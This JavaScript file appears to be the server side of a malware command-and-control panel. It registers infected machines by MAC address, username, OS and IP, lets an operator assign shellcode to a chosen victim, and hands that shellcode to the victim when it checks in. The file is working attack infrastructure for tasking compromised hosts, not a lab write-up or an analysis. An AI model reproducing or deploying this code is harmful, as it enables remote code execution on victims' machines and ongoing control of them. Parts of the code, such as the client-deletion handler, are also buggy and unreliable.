'use strict';
require('isomorphic-fetch');
const file = "./api/data/clients.json";
const fs = require("fs");
var clients_in_memory = {
    clients: []
};

exports.register_client = function (req, res) {
    let client = req.body;
    let ip = get_external_ip(req);

    res.status(200).send(register(client.p, client.m, client.u, client.os, ip));
}

exports.delete_clients = function (req, res) {
    let clientMac = req.body
    clients_in_memory = clients_in_memory.clients.filter(c => c.mac !== clientMac);
}

exports.assign_shellcode = function (req, res) {
    try {
        let data = req.body;
        let client = getClient(data.mac);
        client.shellcode = data.shellcode;
    }
    catch (err) { }

    res.status(200).send();
}

exports.get_clients = function (req, res) {
    res.status(200).send(clients_in_memory.clients);
}

exports.clear_shellcode = function (req, res) {
    let mac = req.body.mac;
    let client = getClient(mac);
    client.shellcode = "";

    res.status(200).send();
}

const getClient = function (mac) {
    let client = clients_in_memory.clients.find(function (c) {
        return c.mac === mac;
    });
    return client;
}

const getDateTime = function () {
    let myDate = new Date();
    let time = myDate.getHours() + ":" + myDate.getMinutes() + ":" + myDate.getSeconds() + ":" + myDate.getMilliseconds();
    let date = (myDate.getMonth() + 1) + "-" + myDate.getDate() + "-" + myDate.getFullYear();

    return {
        date: date,
        time: time
    };
}

const register = function (machine, mac, user, os, ip) {
    try {
        let client = getClient(mac);
        if (!client) {
            clients_in_memory.clients.push({
                "machine_name": machine,
                "username": user,
                "mac": mac,
                "shellcode": ""
            });
        }

        client = getClient(mac);
        client.last_update = getDateTime();
        client.ip_address = ip;
        client.os = os;

        return client.shellcode;
    } catch (err) {
        console.log(err)
        return "";
    }
}

const load_json_into_memory = function () {
    var contents = fs.readFileSync(file, 'utf8');
    clients_in_memory = JSON.parse(contents);
}

const write_memory_to_json = function () {
    fs.writeFile(file, JSON.stringify(clients_in_memory), () => console.log(JSON.stringify(clients_in_memory)));
}

exports.__init = function () {
    load_json_into_memory();
    setInterval(() => write_memory_to_json(), 10000);
}

const get_external_ip = function(req){
    var ip = req.headers['x-forwarded-for'] || 
    req.connection.remoteAddress || 
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    return ip;
}

